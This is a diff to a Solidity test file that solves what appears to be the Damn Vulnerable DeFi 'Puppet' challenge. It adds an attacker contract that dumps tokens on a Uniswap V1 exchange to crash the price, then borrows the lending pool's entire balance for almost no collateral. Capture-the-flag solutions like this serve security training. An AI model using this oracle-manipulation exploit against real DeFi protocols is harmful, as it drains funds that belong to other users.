@@ -8,6 +8,51 @@ import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
 
+contract PuppetAttacker {
+    DamnValuableToken public immutable token;
+    PuppetPool public immutable lendingPool;
+    IUniswapV1Exchange public immutable uniswapExchange;
+    address public immutable recovery;
+
+    constructor(
+        DamnValuableToken _token,
+        PuppetPool _lendingPool,
+        IUniswapV1Exchange _uniswapExchange,
+        address _recovery
+    ) {
+        token = _token;
+        lendingPool = _lendingPool;
+        uniswapExchange = _uniswapExchange;
+        recovery = _recovery;
+    }
+
+    function attack() external payable {
+        uint256 playerTokenBalance = token.balanceOf(msg.sender);
+
+        // Step 1: Transfer all player's tokens to this contract
+        token.transferFrom(msg.sender, address(this), playerTokenBalance);
+
+        // Step 2: Approve Uniswap to spend tokens
+        token.approve(address(uniswapExchange), playerTokenBalance);
+
+        // Step 3: Dump all tokens to Uniswap to crash the price
+        uniswapExchange.tokenToEthSwapInput(
+            playerTokenBalance,
+            1, // min ETH out
+            block.timestamp * 2 // deadline
+        );
+
+        // Step 4: Calculate how much collateral is needed now
+        uint256 poolBalance = token.balanceOf(address(lendingPool));
+        uint256 depositRequired = lendingPool.calculateDepositRequired(poolBalance);
+
+        // Step 5: Borrow all tokens from the lending pool
+        lendingPool.borrow{value: depositRequired}(poolBalance, recovery);
+    }
+
+    receive() external payable {}
+}
+
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
@@ -92,7 +137,14 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        // Deploy attacker contract
+        PuppetAttacker attacker = new PuppetAttacker(token, lendingPool, uniswapV1Exchange, recovery);
+
+        // Approve attacker to spend player's tokens
+        token.approve(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        // Execute attack with player's ETH
+        attacker.attack{value: PLAYER_INITIAL_ETH_BALANCE}();
     }
 
     // Utility function to calculate Uniswap prices
